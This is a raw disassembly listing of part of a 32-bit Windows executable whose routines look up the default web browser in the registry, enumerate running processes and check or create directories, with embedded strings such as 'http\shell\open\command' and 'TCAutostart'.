  406249:	ff                   	(bad)
  40624a:	ff                   	(bad)
  40624b:	ff 29                	ljmp   *(%ecx)
  40624d:	00 00                	add    %al,(%eax)
  40624f:	00 53 4f             	add    %dl,0x4f(%ebx)
  406252:	46                   	inc    %esi
  406253:	54                   	push   %esp
  406254:	57                   	push   %edi
  406255:	41                   	inc    %ecx
  406256:	52                   	push   %edx
  406257:	45                   	inc    %ebp
  406258:	5c                   	pop    %esp
  406259:	4d                   	dec    %ebp
  40625a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406261:	74 5c                	je     0x4062bf
  406263:	57                   	push   %edi
  406264:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  40626b:	43                   	inc    %ebx
  40626c:	75 72                	jne    0x4062e0
  40626e:	72 65                	jb     0x4062d5
  406270:	6e                   	outsb  %ds:(%esi),(%dx)
  406271:	74 56                	je     0x4062c9
  406273:	65 72 73             	gs jb  0x4062e9
  406276:	69 6f 6e 00 00 00 ff 	imul   $0xff000000,0x6e(%edi),%ebp
  40627d:	ff                   	(bad)
  40627e:	ff                   	(bad)
  40627f:	ff 0f                	decl   (%edi)
  406281:	00 00                	add    %al,(%eax)
  406283:	00 50 72             	add    %dl,0x72(%eax)
  406286:	6f                   	outsl  %ds:(%esi),(%dx)
  406287:	67 72 61             	addr16 jb 0x4062eb
  40628a:	6d                   	insl   (%dx),%es:(%edi)
  40628b:	46                   	inc    %esi
  40628c:	69 6c 65 73 44 69 72 	imul   $0x726944,0x73(%ebp,%eiz,2),%ebp
  406293:	00 
  406294:	55                   	push   %ebp
  406295:	8b ec                	mov    %esp,%ebp
  406297:	33 c9                	xor    %ecx,%ecx
  406299:	51                   	push   %ecx
  40629a:	51                   	push   %ecx
  40629b:	51                   	push   %ecx
  40629c:	51                   	push   %ecx
  40629d:	51                   	push   %ecx
  40629e:	53                   	push   %ebx
  40629f:	8b d8                	mov    %eax,%ebx
  4062a1:	33 c0                	xor    %eax,%eax
  4062a3:	55                   	push   %ebp
  4062a4:	68 7b 63 40 00       	push   $0x40637b
  4062a9:	64 ff 30             	push   %fs:(%eax)
  4062ac:	64 89 20             	mov    %esp,%fs:(%eax)
  4062af:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4062b2:	ba 90 63 40 00       	mov    $0x406390,%edx
  4062b7:	e8 9c b8 ff ff       	call   0x401b58
  4062bc:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4062bf:	e8 fc b7 ff ff       	call   0x401ac0
  4062c4:	6a 00                	push   $0x0
  4062c6:	53                   	push   %ebx
  4062c7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4062ca:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4062cd:	b8 00 00 00 80       	mov    $0x80000000,%eax
  4062d2:	e8 b1 fd ff ff       	call   0x406088
  4062d7:	83 3b 00             	cmpl   $0x0,(%ebx)
  4062da:	0f 84 80 00 00 00    	je     0x406360
  4062e0:	8b 03                	mov    (%ebx),%eax
  4062e2:	80 38 22             	cmpb   $0x22,(%eax)
  4062e5:	75 20                	jne    0x406307
  4062e7:	53                   	push   %ebx
  4062e8:	8b 13                	mov    (%ebx),%edx
  4062ea:	b8 b0 63 40 00       	mov    $0x4063b0,%eax
  4062ef:	e8 38 bd ff ff       	call   0x40202c
  4062f4:	8b c8                	mov    %eax,%ecx
  4062f6:	83 c1 02             	add    $0x2,%ecx
  4062f9:	8b 03                	mov    (%ebx),%eax
  4062fb:	ba 02 00 00 00       	mov    $0x2,%edx
  406300:	e8 9f bc ff ff       	call   0x401fa4
  406305:	eb 1e                	jmp    0x406325
  406307:	53                   	push   %ebx
  406308:	8b 13                	mov    (%ebx),%edx
  40630a:	b8 b0 63 40 00       	mov    $0x4063b0,%eax
  40630f:	e8 18 bd ff ff       	call   0x40202c
  406314:	8b c8                	mov    %eax,%ecx
  406316:	83 c1 03             	add    $0x3,%ecx
  406319:	8b 03                	mov    (%ebx),%eax
  40631b:	ba 01 00 00 00       	mov    $0x1,%edx
  406320:	e8 7f bc ff ff       	call   0x401fa4
  406325:	8d 55 f0             	lea    -0x10(%ebp),%edx
  406328:	8b 03                	mov    (%ebx),%eax
  40632a:	e8 49 fe ff ff       	call   0x406178
  40632f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406332:	8d 55 f4             	lea    -0xc(%ebp),%edx
  406335:	e8 06 e4 ff ff       	call   0x404740
  40633a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40633d:	ba c0 63 40 00       	mov    $0x4063c0,%edx
  406342:	e8 4d bb ff ff       	call   0x401e94
  406347:	74 17                	je     0x406360
  406349:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40634c:	e8 8b fe ff ff       	call   0x4061dc
  406351:	8b 55 ec             	mov    -0x14(%ebp),%edx
  406354:	8b c3                	mov    %ebx,%eax
  406356:	b9 cc 63 40 00       	mov    $0x4063cc,%ecx
  40635b:	e8 3c ba ff ff       	call   0x401d9c
  406360:	33 c0                	xor    %eax,%eax
  406362:	5a                   	pop    %edx
  406363:	59                   	pop    %ecx
  406364:	59                   	pop    %ecx
  406365:	64 89 10             	mov    %edx,%fs:(%eax)
  406368:	68 82 63 40 00       	push   $0x406382
  40636d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406370:	ba 05 00 00 00       	mov    $0x5,%edx
  406375:	e8 6a b7 ff ff       	call   0x401ae4
  40637a:	c3                   	ret
  40637b:	e9 8c b4 ff ff       	jmp    0x40180c
  406380:	eb eb                	jmp    0x40636d
  406382:	5b                   	pop    %ebx
  406383:	8b e5                	mov    %ebp,%esp
  406385:	5d                   	pop    %ebp
  406386:	c3                   	ret
  406387:	00 ff                	add    %bh,%bh
  406389:	ff                   	(bad)
  40638a:	ff                   	(bad)
  40638b:	ff 17                	call   *(%edi)
  40638d:	00 00                	add    %al,(%eax)
  40638f:	00 68 74             	add    %ch,0x74(%eax)
  406392:	74 70                	je     0x406404
  406394:	5c                   	pop    %esp
  406395:	73 68                	jae    0x4063ff
  406397:	65 6c                	gs insb (%dx),%es:(%edi)
  406399:	6c                   	insb   (%dx),%es:(%edi)
  40639a:	5c                   	pop    %esp
  40639b:	6f                   	outsl  %ds:(%esi),(%dx)
  40639c:	70 65                	jo     0x406403
  40639e:	6e                   	outsb  %ds:(%esi),(%dx)
  40639f:	5c                   	pop    %esp
  4063a0:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  4063a3:	6d                   	insl   (%dx),%es:(%edi)
  4063a4:	61                   	popa
  4063a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4063a6:	64 00 ff             	fs add %bh,%bh
  4063a9:	ff                   	(bad)
  4063aa:	ff                   	(bad)
  4063ab:	ff 04 00             	incl   (%eax,%eax,1)
  4063ae:	00 00                	add    %al,(%eax)
  4063b0:	2e 65 78 65          	cs js,pn 0x406419
  4063b4:	00 00                	add    %al,(%eax)
  4063b6:	00 00                	add    %al,(%eax)
  4063b8:	ff                   	(bad)
  4063b9:	ff                   	(bad)
  4063ba:	ff                   	(bad)
  4063bb:	ff 03                	incl   (%ebx)
  4063bd:	00 00                	add    %al,(%eax)
  4063bf:	00 45 58             	add    %al,0x58(%ebp)
  4063c2:	45                   	inc    %ebp
  4063c3:	00 ff                	add    %bh,%bh
  4063c5:	ff                   	(bad)
  4063c6:	ff                   	(bad)
  4063c7:	ff 1f                	lcall  *(%edi)
  4063c9:	00 00                	add    %al,(%eax)
  4063cb:	00 5c 49 6e          	add    %bl,0x6e(%ecx,%ecx,2)
  4063cf:	74 65                	je     0x406436
  4063d1:	72 6e                	jb     0x406441
  4063d3:	65 74 20             	gs je  0x4063f6
  4063d6:	45                   	inc    %ebp
  4063d7:	78 70                	js     0x406449
  4063d9:	6c                   	insb   (%dx),%es:(%edi)
  4063da:	6f                   	outsl  %ds:(%esi),(%dx)
  4063db:	72 65                	jb     0x406442
  4063dd:	72 5c                	jb     0x40643b
  4063df:	69 65 78 70 6c 6f 72 	imul   $0x726f6c70,0x78(%ebp),%esp
  4063e6:	65 2e 65 78 65       	gs cs js,pn 0x406450
  4063eb:	00 33                	add    %dh,(%ebx)
  4063ed:	d2 eb                	shr    %cl,%bl
  4063ef:	01 42 80             	add    %eax,-0x80(%edx)
  4063f2:	3c 10                	cmp    $0x10,%al
  4063f4:	00 75 f9             	add    %dh,-0x7(%ebp)
  4063f7:	8b c2                	mov    %edx,%eax
  4063f9:	c3                   	ret
  4063fa:	8b c0                	mov    %eax,%eax
  4063fc:	55                   	push   %ebp
  4063fd:	8b ec                	mov    %esp,%ebp
  4063ff:	51                   	push   %ecx
  406400:	53                   	push   %ebx
  406401:	56                   	push   %esi
  406402:	57                   	push   %edi
  406403:	8b da                	mov    %edx,%ebx
  406405:	8b f0                	mov    %eax,%esi
  406407:	8b c3                	mov    %ebx,%eax
  406409:	e8 b2 b6 ff ff       	call   0x401ac0
  40640e:	56                   	push   %esi
  40640f:	6a 00                	push   $0x0
  406411:	68 10 04 00 00       	push   $0x410
  406416:	e8 2d d2 ff ff       	call   0x403648
  40641b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40641e:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406422:	0f 84 88 00 00 00    	je     0x4064b0
  406428:	33 c0                	xor    %eax,%eax
  40642a:	55                   	push   %ebp
  40642b:	68 a9 64 40 00       	push   $0x4064a9
  406430:	64 ff 30             	push   %fs:(%eax)
  406433:	64 89 20             	mov    %esp,%fs:(%eax)
  406436:	8b c3                	mov    %ebx,%eax
  406438:	ba 04 01 00 00       	mov    $0x104,%edx
  40643d:	e8 32 bc ff ff       	call   0x402074
  406442:	68 b8 64 40 00       	push   $0x4064b8
  406447:	e8 e4 d1 ff ff       	call   0x403630
  40644c:	8b f0                	mov    %eax,%esi
  40644e:	68 c4 64 40 00       	push   $0x4064c4
  406453:	56                   	push   %esi
  406454:	e8 b7 d1 ff ff       	call   0x403610
  406459:	89 c7                	mov    %eax,%edi
  40645b:	68 04 01 00 00       	push   $0x104
  406460:	8b 03                	mov    (%ebx),%eax
  406462:	e8 e1 ba ff ff       	call   0x401f48
  406467:	50                   	push   %eax
  406468:	6a 00                	push   $0x0
  40646a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40646d:	50                   	push   %eax
  40646e:	ff d7                	call   *%edi
  406470:	85 c0                	test   %eax,%eax
  406472:	76 17                	jbe    0x40648b
  406474:	8b 03                	mov    (%ebx),%eax
  406476:	e8 cd ba ff ff       	call   0x401f48
  40647b:	e8 6c ff ff ff       	call   0x4063ec
  406480:	8b d0                	mov    %eax,%edx
  406482:	8b c3                	mov    %ebx,%eax
  406484:	e8 eb bb ff ff       	call   0x402074
  406489:	eb 07                	jmp    0x406492
  40648b:	8b c3                	mov    %ebx,%eax
  40648d:	e8 2e b6 ff ff       	call   0x401ac0
  406492:	33 c0                	xor    %eax,%eax
  406494:	5a                   	pop    %edx
  406495:	59                   	pop    %ecx
  406496:	59                   	pop    %ecx
  406497:	64 89 10             	mov    %edx,%fs:(%eax)
  40649a:	68 b0 64 40 00       	push   $0x4064b0
  40649f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4064a2:	50                   	push   %eax
  4064a3:	e8 90 d0 ff ff       	call   0x403538
  4064a8:	c3                   	ret
  4064a9:	e9 5e b3 ff ff       	jmp    0x40180c
  4064ae:	eb ef                	jmp    0x40649f
  4064b0:	5f                   	pop    %edi
  4064b1:	5e                   	pop    %esi
  4064b2:	5b                   	pop    %ebx
  4064b3:	59                   	pop    %ecx
  4064b4:	5d                   	pop    %ebp
  4064b5:	c3                   	ret
  4064b6:	00 00                	add    %al,(%eax)
  4064b8:	50                   	push   %eax
  4064b9:	53                   	push   %ebx
  4064ba:	41                   	inc    %ecx
  4064bb:	50                   	push   %eax
  4064bc:	49                   	dec    %ecx
  4064bd:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4064c0:	6c                   	insb   (%dx),%es:(%edi)
  4064c1:	00 00                	add    %al,(%eax)
  4064c3:	00 47 65             	add    %al,0x65(%edi)
  4064c6:	74 4d                	je     0x406515
  4064c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4064c9:	64 75 6c             	fs jne 0x406538
  4064cc:	65 46                	gs inc %esi
  4064ce:	69 6c 65 4e 61 6d 65 	imul   $0x45656d61,0x4e(%ebp,%eiz,2),%ebp
  4064d5:	45 
  4064d6:	78 41                	js     0x406519
  4064d8:	00 00                	add    %al,(%eax)
  4064da:	00 00                	add    %al,(%eax)
  4064dc:	55                   	push   %ebp
  4064dd:	8b ec                	mov    %esp,%ebp
  4064df:	81 c4 b8 fe ff ff    	add    $0xfffffeb8,%esp
  4064e5:	53                   	push   %ebx
  4064e6:	56                   	push   %esi
  4064e7:	57                   	push   %edi
  4064e8:	33 c9                	xor    %ecx,%ecx
  4064ea:	89 8d c0 fe ff ff    	mov    %ecx,-0x140(%ebp)
  4064f0:	89 8d b8 fe ff ff    	mov    %ecx,-0x148(%ebp)
  4064f6:	89 8d bc fe ff ff    	mov    %ecx,-0x144(%ebp)
  4064fc:	89 8d d0 fe ff ff    	mov    %ecx,-0x130(%ebp)
  406502:	89 8d c4 fe ff ff    	mov    %ecx,-0x13c(%ebp)
  406508:	89 8d cc fe ff ff    	mov    %ecx,-0x134(%ebp)
  40650e:	89 8d c8 fe ff ff    	mov    %ecx,-0x138(%ebp)
  406514:	8b f2                	mov    %edx,%esi
  406516:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406519:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40651c:	e8 17 ba ff ff       	call   0x401f38
  406521:	33 c0                	xor    %eax,%eax
  406523:	55                   	push   %ebp
  406524:	68 4f 66 40 00       	push   $0x40664f
  406529:	64 ff 30             	push   %fs:(%eax)
  40652c:	64 89 20             	mov    %esp,%fs:(%eax)
  40652f:	33 c0                	xor    %eax,%eax
  406531:	89 06                	mov    %eax,(%esi)
  406533:	33 d2                	xor    %edx,%edx
  406535:	b8 02 00 00 00       	mov    $0x2,%eax
  40653a:	e8 4d eb ff ff       	call   0x40508c
  40653f:	8b f8                	mov    %eax,%edi
  406541:	c7 85 d4 fe ff ff 28 	movl   $0x128,-0x12c(%ebp)
  406548:	01 00 00 
  40654b:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  406551:	8b c7                	mov    %edi,%eax
  406553:	e8 54 eb ff ff       	call   0x4050ac
  406558:	33 db                	xor    %ebx,%ebx
  40655a:	e9 bc 00 00 00       	jmp    0x40661b
  40655f:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  406565:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  40656b:	b9 04 01 00 00       	mov    $0x104,%ecx
  406570:	e8 af b7 ff ff       	call   0x401d24
  406575:	8b 85 c8 fe ff ff    	mov    -0x138(%ebp),%eax
  40657b:	8d 95 cc fe ff ff    	lea    -0x134(%ebp),%edx
  406581:	e8 1e e1 ff ff       	call   0x4046a4
  406586:	8b 85 cc fe ff ff    	mov    -0x134(%ebp),%eax
  40658c:	8d 95 d0 fe ff ff    	lea    -0x130(%ebp),%edx
  406592:	e8 a9 e1 ff ff       	call   0x404740
  406597:	8b 85 d0 fe ff ff    	mov    -0x130(%ebp),%eax
  40659d:	50                   	push   %eax
  40659e:	8d 95 c4 fe ff ff    	lea    -0x13c(%ebp),%edx
  4065a4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065a7:	e8 94 e1 ff ff       	call   0x404740
  4065ac:	8b 95 c4 fe ff ff    	mov    -0x13c(%ebp),%edx
  4065b2:	58                   	pop    %eax
  4065b3:	e8 dc b8 ff ff       	call   0x401e94
  4065b8:	74 4a                	je     0x406604
  4065ba:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  4065c0:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  4065c6:	b9 04 01 00 00       	mov    $0x104,%ecx
  4065cb:	e8 54 b7 ff ff       	call   0x401d24
  4065d0:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
  4065d6:	8d 95 c0 fe ff ff    	lea    -0x140(%ebp),%edx
  4065dc:	e8 5f e1 ff ff       	call   0x404740
  4065e1:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  4065e7:	50                   	push   %eax
  4065e8:	8d 95 b8 fe ff ff    	lea    -0x148(%ebp),%edx
  4065ee:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065f1:	e8 4a e1 ff ff       	call   0x404740
  4065f6:	8b 95 b8 fe ff ff    	mov    -0x148(%ebp),%edx
  4065fc:	58                   	pop    %eax
  4065fd:	e8 92 b8 ff ff       	call   0x401e94
  406602:	75 0a                	jne    0x40660e
  406604:	b3 01                	mov    $0x1,%bl
  406606:	8b 85 dc fe ff ff    	mov    -0x124(%ebp),%eax
  40660c:	89 06                	mov    %eax,(%esi)
  40660e:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  406614:	8b c7                	mov    %edi,%eax
  406616:	e8 b1 ea ff ff       	call   0x4050cc
  40661b:	85 c0                	test   %eax,%eax
  40661d:	0f 85 3c ff ff ff    	jne    0x40655f
  406623:	57                   	push   %edi
  406624:	e8 0f cf ff ff       	call   0x403538
  406629:	33 c0                	xor    %eax,%eax
  40662b:	5a                   	pop    %edx
  40662c:	59                   	pop    %ecx
  40662d:	59                   	pop    %ecx
  40662e:	64 89 10             	mov    %edx,%fs:(%eax)
  406631:	68 56 66 40 00       	push   $0x406656
  406636:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  40663c:	ba 07 00 00 00       	mov    $0x7,%edx
  406641:	e8 9e b4 ff ff       	call   0x401ae4
  406646:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406649:	e8 72 b4 ff ff       	call   0x401ac0
  40664e:	c3                   	ret
  40664f:	e9 b8 b1 ff ff       	jmp    0x40180c
  406654:	eb e0                	jmp    0x406636
  406656:	8b c3                	mov    %ebx,%eax
  406658:	5f                   	pop    %edi
  406659:	5e                   	pop    %esi
  40665a:	5b                   	pop    %ebx
  40665b:	8b e5                	mov    %ebp,%esp
  40665d:	5d                   	pop    %ebp
  40665e:	c3                   	ret
  40665f:	90                   	nop
  406660:	53                   	push   %ebx
  406661:	8b d8                	mov    %eax,%ebx
  406663:	8b c3                	mov    %ebx,%eax
  406665:	e8 de b8 ff ff       	call   0x401f48
  40666a:	50                   	push   %eax
  40666b:	e8 70 cf ff ff       	call   0x4035e0
  406670:	83 f8 ff             	cmp    $0xffffffff,%eax
  406673:	74 04                	je     0x406679
  406675:	a8 10                	test   $0x10,%al
  406677:	75 04                	jne    0x40667d
  406679:	33 c0                	xor    %eax,%eax
  40667b:	5b                   	pop    %ebx
  40667c:	c3                   	ret
  40667d:	b0 01                	mov    $0x1,%al
  40667f:	5b                   	pop    %ebx
  406680:	c3                   	ret
  406681:	8d 40 00             	lea    0x0(%eax),%eax
  406684:	55                   	push   %ebp
  406685:	8b ec                	mov    %esp,%ebp
  406687:	33 c9                	xor    %ecx,%ecx
  406689:	51                   	push   %ecx
  40668a:	51                   	push   %ecx
  40668b:	51                   	push   %ecx
  40668c:	51                   	push   %ecx
  40668d:	53                   	push   %ebx
  40668e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406691:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406694:	e8 9f b8 ff ff       	call   0x401f38
  406699:	33 c0                	xor    %eax,%eax
  40669b:	55                   	push   %ebp
  40669c:	68 94 67 40 00       	push   $0x406794
  4066a1:	64 ff 30             	push   %fs:(%eax)
  4066a4:	64 89 20             	mov    %esp,%fs:(%eax)
  4066a7:	33 db                	xor    %ebx,%ebx
  4066a9:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4066ad:	0f 84 c6 00 00 00    	je     0x406779
  4066b3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4066b6:	e8 a5 ff ff ff       	call   0x406660
  4066bb:	3c 01                	cmp    $0x1,%al
  4066bd:	75 07                	jne    0x4066c6
  4066bf:	b3 01                	mov    $0x1,%bl
  4066c1:	e9 b3 00 00 00       	jmp    0x406779
  4066c6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4066c9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4066cc:	e8 87 b4 ff ff       	call   0x401b58
  4066d1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4066d4:	e8 77 b6 ff ff       	call   0x401d50
  4066d9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4066dc:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  4066e1:	74 7c                	je     0x40675f
  4066e3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4066e6:	ba ac 67 40 00       	mov    $0x4067ac,%edx
  4066eb:	e8 68 b6 ff ff       	call   0x401d58
  4066f0:	eb 6d                	jmp    0x40675f
  4066f2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4066f5:	50                   	push   %eax
  4066f6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4066f9:	b8 ac 67 40 00       	mov    $0x4067ac,%eax
  4066fe:	e8 29 b9 ff ff       	call   0x40202c
  406703:	8b c8                	mov    %eax,%ecx
  406705:	ba 01 00 00 00       	mov    $0x1,%edx
  40670a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40670d:	e8 92 b8 ff ff       	call   0x401fa4
  406712:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406715:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406718:	e8 3b b6 ff ff       	call   0x401d58
  40671d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406720:	b8 ac 67 40 00       	mov    $0x4067ac,%eax
  406725:	e8 02 b9 ff ff       	call   0x40202c
  40672a:	8b c8                	mov    %eax,%ecx
  40672c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40672f:	ba 01 00 00 00       	mov    $0x1,%edx
  406734:	e8 ab b8 ff ff       	call   0x401fe4
  406739:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40673c:	e8 1f ff ff ff       	call   0x406660
  406741:	84 c0                	test   %al,%al
  406743:	75 1a                	jne    0x40675f
  406745:	6a 00                	push   $0x0
  406747:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40674a:	e8 f9 b7 ff ff       	call   0x401f48
  40674f:	50                   	push   %eax
  406750:	e8 f3 cd ff ff       	call   0x403548
  406755:	83 f8 01             	cmp    $0x1,%eax
  406758:	1b c0                	sbb    %eax,%eax
  40675a:	40                   	inc    %eax
  40675b:	84 c0                	test   %al,%al
  40675d:	74 1a                	je     0x406779
  40675f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406762:	b8 ac 67 40 00       	mov    $0x4067ac,%eax
  406767:	e8 c0 b8 ff ff       	call   0x40202c
  40676c:	48                   	dec    %eax
  40676d:	7d 83                	jge    0x4066f2
  40676f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406772:	e8 e9 fe ff ff       	call   0x406660
  406777:	8b d8                	mov    %eax,%ebx
  406779:	33 c0                	xor    %eax,%eax
  40677b:	5a                   	pop    %edx
  40677c:	59                   	pop    %ecx
  40677d:	59                   	pop    %ecx
  40677e:	64 89 10             	mov    %edx,%fs:(%eax)
  406781:	68 9b 67 40 00       	push   $0x40679b
  406786:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406789:	ba 04 00 00 00       	mov    $0x4,%edx
  40678e:	e8 51 b3 ff ff       	call   0x401ae4
  406793:	c3                   	ret
  406794:	e9 73 b0 ff ff       	jmp    0x40180c
  406799:	eb eb                	jmp    0x406786
  40679b:	8b c3                	mov    %ebx,%eax
  40679d:	5b                   	pop    %ebx
  40679e:	8b e5                	mov    %ebp,%esp
  4067a0:	5d                   	pop    %ebp
  4067a1:	c3                   	ret
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	ff                   	(bad)
  4067a5:	ff                   	(bad)
  4067a6:	ff                   	(bad)
  4067a7:	ff 01                	incl   (%ecx)
  4067a9:	00 00                	add    %al,(%eax)
  4067ab:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  4067af:	00 55 8b             	add    %dl,-0x75(%ebp)
  4067b2:	ec                   	in     (%dx),%al
  4067b3:	33 c0                	xor    %eax,%eax
  4067b5:	55                   	push   %ebp
  4067b6:	68 d5 67 40 00       	push   $0x4067d5
  4067bb:	64 ff 30             	push   %fs:(%eax)
  4067be:	64 89 20             	mov    %esp,%fs:(%eax)
  4067c1:	ff 05 8c e9 40 00    	incl   0x40e98c
  4067c7:	33 c0                	xor    %eax,%eax
  4067c9:	5a                   	pop    %edx
  4067ca:	59                   	pop    %ecx
  4067cb:	59                   	pop    %ecx
  4067cc:	64 89 10             	mov    %edx,%fs:(%eax)
  4067cf:	68 dc 67 40 00       	push   $0x4067dc
  4067d4:	c3                   	ret
  4067d5:	e9 32 b0 ff ff       	jmp    0x40180c
  4067da:	eb f8                	jmp    0x4067d4
  4067dc:	5d                   	pop    %ebp
  4067dd:	c3                   	ret
  4067de:	8b c0                	mov    %eax,%eax
  4067e0:	83 2d 8c e9 40 00 01 	subl   $0x1,0x40e98c
  4067e7:	c3                   	ret
  4067e8:	34 68                	xor    $0x68,%al
  4067ea:	40                   	inc    %eax
	...
  406807:	00 34 68             	add    %dh,(%eax,%ebp,2)
  40680a:	40                   	inc    %eax
  40680b:	00 04 00             	add    %al,(%eax,%eax,1)
  40680e:	00 00                	add    %al,(%eax)
  406810:	20 10                	and    %dl,(%eax)
  406812:	40                   	inc    %eax
  406813:	00 5c 15 40          	add    %bl,0x40(%ebp,%edx,1)
  406817:	00 68 15             	add    %ch,0x15(%eax)
  40681a:	40                   	inc    %eax
  40681b:	00 6c 15 40          	add    %ch,0x40(%ebp,%edx,1)
  40681f:	00 70 15             	add    %dh,0x15(%eax)
  406822:	40                   	inc    %eax
  406823:	00 64 15 40          	add    %ah,0x40(%ebp,%edx,1)
  406827:	00 40 14             	add    %al,0x14(%eax)
  40682a:	40                   	inc    %eax
  40682b:	00 5c 14 40          	add    %bl,0x40(%esp,%edx,1)
  40682f:	00 98 14 40 00 0b    	add    %bl,0xb004014(%eax)
  406835:	54                   	push   %esp
  406836:	43                   	inc    %ebx
  406837:	41                   	inc    %ecx
  406838:	75 74                	jne    0x4068ae
  40683a:	6f                   	outsl  %ds:(%esi),(%dx)
  40683b:	73 74                	jae    0x4068b1
  40683d:	61                   	popa
  40683e:	72 74                	jb     0x4068b4
  406840:	53                   	push   %ebx
  406841:	56                   	push   %esi
  406842:	84 d2                	test   %dl,%dl
  406844:	74 08                	je     0x40684e
  406846:	83 c4 f0             	add    $0xfffffff0,%esp
  406849:	e8 4a ad ff ff       	call   0x401598
  40684e:	8b da                	mov    %edx,%ebx
  406850:	8b f0                	mov    %eax,%esi
  406852:	33 d2                	xor    %edx,%edx
  406854:	8b c6                	mov    %esi,%eax
  406856:	e8 1d ac ff ff       	call   0x401478
  40685b:	8b c6                	mov    %esi,%eax
  40685d:	84 db                	test   %bl,%bl
  40685f:	74 0f                	je     0x406870
  406861:	e8 8a ad ff ff       	call   0x4015f0
  406866:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  40686d:	83 c4 0c             	add    $0xc,%esp
  406870:	8b c6                	mov    %esi,%eax
  406872:	5e                   	pop    %esi
  406873:	5b                   	pop    %ebx
  406874:	c3                   	ret
  406875:	8d 40 00             	lea    0x0(%eax),%eax
  406878:	53                   	push   %ebx
  406879:	56                   	push   %esi
  40687a:	e8 81 ad ff ff       	call   0x401600
  40687f:	8b da                	mov    %edx,%ebx
  406881:	8b f0                	mov    %eax,%esi
  406883:	8b d3                	mov    %ebx,%edx
  406885:	80 e2 fc             	and    $0xfc,%dl
  406888:	8b c6                	mov    %esi,%eax
  40688a:	e8 09 ac ff ff       	call   0x401498
  40688f:	84 db                	test   %bl,%bl
  406891:	7e 07                	jle    0x40689a
  406893:	8b c6                	mov    %esi,%eax
  406895:	e8 4e ad ff ff       	call   0x4015e8
  40689a:	5e                   	pop    %esi
  40689b:	5b                   	pop    %ebx
  40689c:	c3                   	ret
  40689d:	8d 40 00             	lea    0x0(%eax),%eax
  4068a0:	ff                   	(bad)
  4068a1:	ff                   	(bad)
  4068a2:	ff                   	(bad)
  4068a3:	ff 09                	decl   (%ecx)
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	00 20                	add    %ah,(%eax)
  4068a9:	52                   	push   %edx
  4068aa:	65 73 74             	gs jae 0x406921
  4068ad:	61                   	popa
  4068ae:	72 74                	jb     0x406924
  4068b0:	00 00                	add    %al,(%eax)
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	55                   	push   %ebp
  4068b5:	8b ec                	mov    %esp,%ebp
  4068b7:	6a 00                	push   $0x0
  4068b9:	6a 00                	push   $0x0
  4068bb:	6a 00                	push   $0x0
  4068bd:	6a 00                	push   $0x0
  4068bf:	6a 00                	push   $0x0
  4068c1:	53                   	push   %ebx
  4068c2:	56                   	push   %esi
  4068c3:	8b d9                	mov    %ecx,%ebx
  4068c5:	8b f2                	mov    %edx,%esi
  4068c7:	33 c0                	xor    %eax,%eax
  4068c9:	55                   	push   %ebp
  4068ca:	68 8a 69 40 00       	push   $0x40698a
  4068cf:	64 ff 30             	push   %fs:(%eax)
  4068d2:	64 89 20             	mov    %esp,%fs:(%eax)
  4068d5:	6a 00                	push   $0x0
  4068d7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4068da:	50                   	push   %eax
  4068db:	6a 00                	push   $0x0
  4068dd:	6a 02                	push   $0x2
  4068df:	6a 00                	push   $0x0
  4068e1:	6a 00                	push   $0x0
